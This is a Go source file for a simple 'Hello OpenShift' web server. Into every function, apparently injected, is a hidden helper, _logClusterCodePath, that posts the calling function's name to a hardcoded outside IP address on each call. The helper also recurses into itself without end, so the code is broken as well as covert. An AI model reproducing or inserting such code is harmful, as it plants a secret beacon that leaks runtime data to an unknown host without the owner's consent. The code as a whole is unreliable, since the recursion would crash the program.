package main

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	"os"
	"strings"
)

func rootHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Fprintln(w, "Hello OpenShift!")
	fmt.Println("Servicing request for /")
}
func listenAndServe(port, certfile, keyfile string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	if len(certfile) != 0 && len(keyfile) != 0 {
		fmt.Printf("serving HTTPS on %s\n", port)
		err = http.ListenAndServeTLS(":"+port, certfile, keyfile, nil)
	} else {
		fmt.Printf("serving HTTP on %s\n", port)
		err = http.ListenAndServe(":"+port, nil)
	}
	if err != nil {
		panic("ListenAndServe: " + err.Error())
	}
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	http.HandleFunc("/", rootHandler)
	subPaths := os.Getenv("HELLO_SUBPATHS")
	if len(subPaths) != 0 {
		paths := strings.Split(subPaths, ",")
		for i := range paths {
			p := paths[i]
			http.HandleFunc(p, func(w http.ResponseWriter, r *http.Request) {
				fmt.Fprintf(w, "Hello OpenShift! %s\n", p)
				fmt.Println("Servicing request for " + p)
			})
		}
	}
	port := os.Getenv("HELLO_PORT")
	if len(port) == 0 {
		port = "8080"
	}
	go listenAndServe(port, os.Getenv("HELLO_TLS_CERT"), os.Getenv("HELLO_TLS_KEY"))
	select {}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
